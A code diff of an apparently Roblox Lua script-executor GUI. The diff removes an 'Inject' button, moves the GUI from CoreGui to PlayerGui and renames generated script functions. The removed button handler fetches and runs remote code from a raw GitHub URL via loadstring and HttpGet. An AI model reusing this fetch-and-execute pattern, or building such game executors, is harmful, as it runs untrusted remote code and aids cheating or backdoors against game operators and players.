@@ -50,15 +50,13 @@ local ScrollingFrame = Instance.new("ScrollingFrame")
 local UIListLayout_2 = Instance.new("UIListLayout")
 local TextLabel_4 = Instance.new("TextLabel")
 local UICorner_12 = Instance.new("UICorner")
-local Inject = Instance.new("TextButton")
-local UICorner_13 = Instance.new("UICorner")
 local Scan = Instance.new("TextButton")
-local UICorner_14 = Instance.new("UICorner")
+local UICorner_13 = Instance.new("UICorner")
 local TextLabel_5 = Instance.new("TextLabel")
 
 --Properties:
 
-ScreenGui.Parent = game.CoreGui
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
 SSFRAME.Name = "SSFRAME"
@@ -393,35 +391,20 @@ TextLabel_4.TextSize = 14.000
 UICorner_12.CornerRadius = UDim.new(0, 5)
 UICorner_12.Parent = TextLabel_4
 
-Inject.Name = "Inject"
-Inject.Parent = SSFRAME
-Inject.BackgroundColor3 = Color3.fromRGB(72, 70, 70)
-Inject.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Inject.BorderSizePixel = 0
-Inject.Position = UDim2.new(0.809737623, -3, 0.870307148, 0)
-Inject.Size = UDim2.new(0, 95, 0, 30)
-Inject.Font = Enum.Font.Code
-Inject.Text = "Inject"
-Inject.TextColor3 = Color3.fromRGB(226, 226, 226)
-Inject.TextSize = 14.000
-
-UICorner_13.CornerRadius = UDim.new(0, 5)
-UICorner_13.Parent = Inject
-
 Scan.Name = "Scan"
 Scan.Parent = SSFRAME
 Scan.BackgroundColor3 = Color3.fromRGB(72, 70, 70)
 Scan.BorderColor3 = Color3.fromRGB(0, 0, 0)
 Scan.BorderSizePixel = 0
-Scan.Position = UDim2.new(0.620244205, -3, 0.870307148, 0)
+Scan.Position = UDim2.new(0.809737623, -3, 0.870307148, 0)
 Scan.Size = UDim2.new(0, 95, 0, 30)
 Scan.Font = Enum.Font.Code
 Scan.Text = "Scan"
 Scan.TextColor3 = Color3.fromRGB(226, 226, 226)
 Scan.TextSize = 14.000
 
-UICorner_14.CornerRadius = UDim.new(0, 5)
-UICorner_14.Parent = Scan
+UICorner_13.CornerRadius = UDim.new(0, 5)
+UICorner_13.Parent = Scan
 
 TextLabel_5.Parent = ScreenGui
 TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
@@ -439,7 +422,7 @@ TextLabel_5.TextTransparency = 0.390
 
 -- Scripts:
 
-local function HJWC_script() -- TextBox.SyntaxHighlighter 
+local function JTST_script() -- TextBox.SyntaxHighlighter 
 	local script = Instance.new('LocalScript', TextBox)
 
 	local textBox = script.Parent
@@ -489,8 +472,8 @@ local function HJWC_script() -- TextBox.SyntaxHighlighter
 	highlightSyntax()
 	
 end
-coroutine.wrap(HJWC_script)()
-local function HZLAIQ_script() -- TextBox.LocalScript 
+coroutine.wrap(JTST_script)()
+local function OAPU_script() -- TextBox.LocalScript 
 	local script = Instance.new('LocalScript', TextBox)
 
 	local ReplicatedStorage = game:GetService("TextChatService")
@@ -516,8 +499,8 @@ local function HZLAIQ_script() -- TextBox.LocalScript
 	textButton.MouseButton1Click:Connect(onExecuteButtonClick)
 	
 end
-coroutine.wrap(HZLAIQ_script)()
-local function VJCKIEV_script() -- TextBox_2.SyntaxHighlighter 
+coroutine.wrap(OAPU_script)()
+local function JQSUL_script() -- TextBox_2.SyntaxHighlighter 
 	local script = Instance.new('LocalScript', TextBox_2)
 
 	local textBox = script.Parent
@@ -564,8 +547,8 @@ local function VJCKIEV_script() -- TextBox_2.SyntaxHighlighter
 	highlightSyntax()
 	
 end
-coroutine.wrap(VJCKIEV_script)()
-local function MMYC_script() -- Execute.LocalScript 
+coroutine.wrap(JQSUL_script)()
+local function CJJRC_script() -- Execute.LocalScript 
 	local script = Instance.new('LocalScript', Execute)
 
 	local replicatedStorage = game:GetService("ReplicatedStorage")
@@ -592,8 +575,8 @@ local function MMYC_script() -- Execute.LocalScript
 	button.MouseButton1Click:Connect(onButtonClick)
 	
 end
-coroutine.wrap(MMYC_script)()
-local function POHHK_script() -- Clear.ClearTextBoxOnClick 
+coroutine.wrap(CJJRC_script)()
+local function OAYWUTY_script() -- Clear.ClearTextBoxOnClick 
 	local script = Instance.new('LocalScript', Clear)
 
 	local clearButton = script.Parent
@@ -607,8 +590,8 @@ local function POHHK_script() -- Clear.ClearTextBoxOnClick
 	
 	
 end
-coroutine.wrap(POHHK_script)()
-local function YHWTR_script() -- SSFRAME.UIDrag 
+coroutine.wrap(OAYWUTY_script)()
+local function VYVTVHC_script() -- SSFRAME.UIDrag 
 	local script = Instance.new('LocalScript', SSFRAME)
 
 	-- Made by Real_IceyDev (@lceyDex) --
@@ -649,8 +632,8 @@ local function YHWTR_script() -- SSFRAME.UIDrag
 		end
 	end)
 end
-coroutine.wrap(YHWTR_script)()
-local function GUTAB_script() -- TextBox_3.SyntaxHighlighter 
+coroutine.wrap(VYVTVHC_script)()
+local function XVFXHHA_script() -- TextBox_3.SyntaxHighlighter 
 	local script = Instance.new('LocalScript', TextBox_3)
 
 	local textBox = script.Parent
@@ -697,16 +680,8 @@ local function GUTAB_script() -- TextBox_3.SyntaxHighlighter
 	highlightSyntax()
 	
 end
-coroutine.wrap(GUTAB_script)()
-local function KRSN_script() -- Inject.LocalScript 
-	local script = Instance.new('LocalScript', Inject)
-
-	script.Parent.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/mw-tr/Check/refs/heads/main/Lol"))()
-	end)
-end
-coroutine.wrap(KRSN_script)()
-local function IWFAS_script() -- Scan.LocalScript 
+coroutine.wrap(XVFXHHA_script)()
+local function PTMI_script() -- Scan.LocalScript 
 	local script = Instance.new('LocalScript', Scan)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -739,8 +714,8 @@ local function IWFAS_script() -- Scan.LocalScript
 		end
 	end)
 end
-coroutine.wrap(IWFAS_script)()
-local function EXSOZ_script() -- ScreenGui.ToggleFrameVisibility 
+coroutine.wrap(PTMI_script)()
+local function WMTBBC_script() -- ScreenGui.ToggleFrameVisibility 
 	local script = Instance.new('LocalScript', ScreenGui)
 
 	local UserInputService = game:GetService("UserInputService")
@@ -759,4 +734,4 @@ local function EXSOZ_script() -- ScreenGui.ToggleFrameVisibility
 	
 	
 end
-coroutine.wrap(EXSOZ_script)()
+coroutine.wrap(WMTBBC_script)()
